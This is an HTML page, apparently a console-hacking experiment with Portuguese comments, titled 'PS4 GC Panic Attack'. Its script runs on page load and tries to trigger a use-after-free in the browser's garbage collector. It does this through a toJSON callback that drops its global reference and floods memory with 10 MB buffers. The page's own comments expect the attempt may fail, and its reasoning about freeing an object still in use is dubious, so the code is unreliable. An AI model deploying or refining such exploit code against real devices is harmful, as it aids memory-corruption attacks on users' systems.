<!DOCTYPE html>
<html>
<head>
    <title>PS4 GC Panic Attack</title>
    <style>
        body { background: #300; color: #fff; font-family: monospace; padding: 20px; font-size: 24px; }
        #hud { border: 2px solid #f00; padding: 10px; background: #000; }
    </style>
</head>
<body>
    <div id="hud">
        STATUS: <span id="status">PREPARANDO...</span><br>
        MEMÓRIA: <span id="mem">0 MB</span>
    </div>

    <script>
        const status = document.getElementById('status');
        const memDisp = document.getElementById('mem');
        let pressure = [];

        // Função para comer memória RAM rapidamente
        function eatMemory() {
            try {
                for(let i=0; i<1000; i++) {
                    // Aloca blocos de 10MB
                    pressure.push(new ArrayBuffer(1024 * 1024 * 10));
                }
            } catch(e) {
                // Memória cheia, o GC deve rodar agora
                pressure = []; // Solta tudo
            }
        }

        function runExploit() {
            status.innerText = "ARMANDO A BOMBA...";
            
            // Objeto Vítima
            // Usamos uma estrutura complexa para confundir o GC
            let root = { 
                a: { 
                    // O Gatilho
                    toJSON: function() {
                        status.innerText = ">>> GC PANIC INICIADO <<<";
                        status.style.color = "red";
                        
                        // 1. Remove a ÚNICA referência que segura este objeto
                        // Agora o objeto 'root' é lixo tecnicamente, 
                        // MAS o JSON.stringify ainda está "em cima" dele na pilha C++
                        globalRoot = null; 
                        
                        // 2. Força pressão extrema de memória para acordar o GC
                        // O GC vai tentar limpar o 'root' porque não tem referências
                        eatMemory();
                        eatMemory();
                        
                        return "trap";
                    }
                },
                b: new Uint8Array(1024).fill(0x41) // O alvo do UAF
            };

            // Salva referência global
            window.globalRoot = root;

            setTimeout(() => {
                status.innerText = "DISPARANDO...";
                try {
                    // Inicia a serialização
                    JSON.stringify(window.globalRoot);
                    
                    // Se chegar aqui, falhou
                    status.innerText = "FALHA: O GC foi inteligente e não deletou o objeto ativo.";
                    status.style.color = "yellow";
                } catch(e) {
                    status.innerText = "ERRO: " + e.message;
                }
            }, 500);
        }

        setTimeout(runExploit, 1000);
    </script>
</body>
</html>
